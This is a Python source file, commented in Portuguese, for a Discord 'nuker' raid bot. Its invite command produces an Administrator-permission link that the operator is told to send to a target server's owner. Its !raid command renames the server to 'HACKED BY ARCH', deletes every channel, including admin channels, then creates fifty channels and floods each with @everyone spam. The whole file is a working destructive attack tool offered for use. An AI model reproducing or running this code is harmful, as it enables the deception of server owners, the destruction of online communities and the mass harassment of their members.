import discord
from discord.ext import commands
import asyncio
import os

# ───────────────────────────────────────────────────────────────────────────────
# CONFIGURAÇÕES FINAIS - NUKER PRO (VERSÃO SEM LOGO.PNG)
# ───────────────────────────────────────────────────────────────────────────────

TOKEN = ""
NOME_CANAL = "HACKED BY ARCH"
RAID_COUNT = 100 # Quantidade de mensagens por canal para ser mais rápido

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f" RAID BOT: {bot.user}")
    print(f"ID do Bot: {bot.user.id}")
    print("-" * 30)
    print("COMANDOS DISPONÍVEIS:")
    print("!convite           - Gera o link de Admin para mandar pro alvo")
    print("!raid              - Inicia a destruição em QUALQUER canal")
    print("-" * 30)

@bot.command()
async def convite(ctx):
    """Gera o link de convite com permissão de Administrador (8)"""
    link = f"https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot"
    await ctx.send(f" **Mande este link para o dono do servidor alvo:**\n{link}")

@bot.command(name="raid")
async def raid_total(ctx):
    """
    O comando !raid agora funciona em qualquer canal.
    Ele apaga todos os canais (incluindo os de administração) e cria vários novos.
    """
    guild = ctx.guild
    
    if not guild:
        return

    # 1. Tentar mudar o nome do servidor
    try:
        await guild.edit(name="HACKED BY ARCH")
    except:
        pass

    # 2. APAGAR TODOS OS CANAIS EXISTENTES (INCLUINDO ADM)
    print(f"Destruindo canais em {guild.name}...")
    
    # Coletar todos os canais (incluindo categorias, canais de voz e texto)
    # Vamos iterar para garantir que nada escape, inclusive canais de administração
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Canal {channel.name} deletado.")
        except Exception as e:
            print(f"Erro ao deletar {channel.name}: {e}")
            continue

    # 3. FUNÇÃO PARA CRIAR CANAL E ENVIAR MENSAGENS
    async def spawn_and_raid():
        try:
            # Cria o canal com o nome solicitado
            new_channel = await guild.create_text_channel(NOME_CANAL)
            
            # Loop de mensagens pesado
            for _ in range(RAID_COUNT):
                try:
                    embed = discord.Embed(title=" HACKED BY ARCH", color=0xFF0000)
                    # Usando apenas a URL da imagem para não depender de arquivo local
                    embed.set_image(url="https://images-ext-1.discordapp.net/external/XJi-IRcNwpSLDwOOBVNTA5cquPBeONKESCOKpYN4F40/%3Fsize%3D2048/https/cdn.discordapp.com/icons/1474633997853130845/7e9379d99cc4a12830f67e1a0886524a.png?format=webp&quality=lossless")
                    
                    msg_content = "@everyone HACKED BY ARCH!!!"
                    
                    # Enviando apenas o embed com a imagem remota
                    await new_channel.send(content=msg_content, embed=embed)
                except:
                    break 
        except:
            pass

    # Cria 50 frentes de ataque (canais novos) ao mesmo tempo
    print("Recriando e raidando...")
    raid_tasks = [spawn_and_raid() for _ in range(50)]
    await asyncio.gather(*raid_tasks, return_exceptions=True)

if __name__ == "__main__":
    bot.run(TOKEN)
